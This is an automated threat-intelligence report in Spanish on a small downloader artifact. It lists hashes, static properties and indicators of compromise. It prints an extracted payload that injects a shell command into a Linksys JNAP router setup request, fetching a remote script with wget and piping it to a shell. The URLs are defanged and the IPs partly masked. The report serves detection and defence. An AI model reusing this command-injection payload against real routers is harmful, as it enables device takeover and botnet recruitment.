# 🧬 Payload Analysis

`ec0afe4cda9d579d3a5be23aa6f01648394e99e35fc856fb5ab22608b03b1f7e`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 430 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se extrajeron 2 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:42:54.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `ec0afe4cda9d579d3a5be23aa6f01648394e99e35fc856fb5ab22608b03b1f7e`
- **MD5:** `cca3b3d4e028dcc97a64bed113e3bf59`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 430 B |
| Entropía | 5.36 |
| Strings | 7 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
{"JNAP":{"action":"hxxp://linksys[.]com/jnap/setup/SetupWizard","command":"`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|s
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| url | hxxp://linksys[.]com/jnap/setup/SetupWizard | strings |
| ip | 91.92.40.XXX | static_analysis |
| ip | 190.179.175.XXX | static_analysis |
| command | {"JNAP":{"action":"hxxp://linksys[.]com/jnap/setup/SetupWizard","command":"`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|s | strings |
| hash | ec0afe4cda9d579d3a5be23aa6f01648394e99e35fc856fb5ab22608b03b1f7e | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
